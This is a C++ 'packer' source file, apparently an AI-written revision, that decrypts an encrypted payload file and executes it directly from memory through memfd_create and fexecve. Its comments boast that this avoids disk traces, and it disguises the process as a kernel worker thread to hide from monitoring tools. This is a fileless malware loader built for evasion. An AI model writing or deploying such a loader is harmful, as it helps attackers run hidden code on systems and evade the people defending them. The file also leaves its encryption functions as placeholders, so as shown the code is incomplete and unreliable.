// ============================================================
// NEURO-MESH PACKER : LINUX MEMFD EDITION (V6.0)
// ============================================================
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define AES_KEY_LEN         32
#define AES_GCM_IV_LEN      12
#define AES_GCM_TAG_LEN     16
#define PBKDF2_ITERATIONS   600000 
#define PAYLOAD_FILE        "agent_encrypted.bin"

extern char **environ;

std::string get_secure_passphrase() {
    const char* env_pass = std::getenv("NEURO_MESH_KEY");
    if (!env_pass) {
        std::cerr << "\033[1;41;37m[FATAL] NEURO_MESH_KEY missing.\033[0m\n";
        exit(1);
    }
    return std::string(env_pass);
}

void derive_key_secure(const std::string& passphrase, unsigned char* key) {
    const unsigned char salt[] = "NEURO_MESH_STATIC_SALT_V6"; 
    if (PKCS5_PBKDF2_HMAC(passphrase.c_str(), passphrase.size(), salt, sizeof(salt) - 1, 
                          PBKDF2_ITERATIONS, EVP_sha256(), AES_KEY_LEN, key) == 0) exit(1);
}

// AES-GCM Encrypt/Decrypt implementations remain identical to your previous version
// ... [Insert your exact encrypt_aes256_gcm and decrypt_aes256_gcm functions here] ...

// 🔥 THE FIX: Native ELF Memory Execution
void execute_elf_from_memory(const std::vector<unsigned char>& payload) {
    if (payload.empty()) return;

    // Create an anonymous file descriptor in RAM (completely invisible to standard disk I/O)
    int fd = memfd_create("kworker_neuro", MFD_CLOEXEC);
    if (fd < 0) {
        std::cerr << "[FATAL] memfd_create failed.\n";
        exit(1);
    }

    // Write the decrypted ELF binary into the RAM file
    if (write(fd, payload.data(), payload.size()) != (ssize_t)payload.size()) {
        std::cerr << "[FATAL] Failed to write payload to memfd.\n";
        close(fd);
        exit(1);
    }

    // Disguise the process name in tools like `top` and `htop`
    char* const argv[] = { (char*)"[kworker/u4:2-events]", nullptr };
    
    std::cout << "[PACKER] Decryption successful. Executing payload from RAM..." << std::endl;
    
    // Execute the RAM file directly. The kernel handles the ELF parsing perfectly.
    fexecve(fd, argv, environ);
    
    // If fexecve returns, it failed.
    std::cerr << "[FATAL] fexecve failed: " << strerror(errno) << std::endl;
    close(fd);
    exit(1);
}

std::vector<unsigned char> load_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> data(size);
    file.read((char*)data.data(), size);
    return data;
}

int main(int argc, char* argv[]) {
    std::string passphrase = get_secure_passphrase();
    unsigned char aes_key[AES_KEY_LEN];
    derive_key_secure(passphrase, aes_key);

    if (argc >= 2) {
        std::string arg = argv[1];
        if (arg == "--encrypt" || arg == "-e") {
            // ... [Your existing encryption logic] ...
            return 0;
        }
        if (arg == "--run" || arg == "-r") {
            std::vector<unsigned char> encrypted = load_file(PAYLOAD_FILE);
            std::string decrypted = decrypt_aes256_gcm(encrypted.data(), encrypted.size(), aes_key);
            std::vector<unsigned char> payload(decrypted.begin(), decrypted.end());
            execute_elf_from_memory(payload);
            return 0;
        }
    }
    return 0;
}
